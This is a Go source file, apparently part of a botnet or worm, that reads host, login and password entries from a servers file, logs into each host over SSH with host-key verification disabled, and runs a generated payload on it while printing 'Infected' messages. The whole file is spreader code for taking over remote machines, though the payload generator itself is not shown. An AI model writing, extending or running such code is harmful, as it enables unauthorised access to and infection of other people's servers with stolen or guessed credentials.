package server

import (
	"bytes"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type Sshsess struct {
	Ip       string
	Password string
	Login    string
	Config   *ssh.ClientConfig
	Session  *ssh.Client
}

var wg sync.WaitGroup

func Scan() {

	defer func() { // try catch
		if er := recover(); er != nil {
			println("Scan: ")
			fmt.Print(er)
			return
		}
	}()

	data, err := os.ReadFile("./data/servers.txt")
	if err != nil {
		fmt.Println("Read servers: " + err.Error())
	}

	for _, i := range strings.Split(string(data), "\n 	") {
		serv := strings.Split(string(i), ":")

		if len(serv) < 2 {
			continue
		}

		wg.Add(1)
		go func() {
			ses, err := sshNew(serv[1], serv[2], serv[0])
			if err != nil {
				fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[0] + ":22")
				wg.Done()
				return
			}

			ses.Inject(&wg)
		}()
	}
}

func sshNew(login, pass string, host string) (*Sshsess, error) {

	conf := &ssh.ClientConfig{
		User:    login,
		Timeout: 5 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", host+":22", conf)

	if err != nil {
		return &Sshsess{}, err
	}

	return &Sshsess{
		Ip:       host,
		Password: pass,
		Login:    login,
		Config:   conf,
		Session:  conn,
	}, nil
}

func (sess *Sshsess) Inject(w *sync.WaitGroup) {

	sshSesh, _ := sess.Session.NewSession()
	var setSession bytes.Buffer
	sshSesh.Stdout = &setSession

	fmt.Println("[HOMO SCANNER] Infected: " + sess.Ip + ":22")

	go func() {
		payload := GeneratePayload()
		sshSesh.Run(payload)
		sshSesh.Close()

	}()
	wg.Done()
}
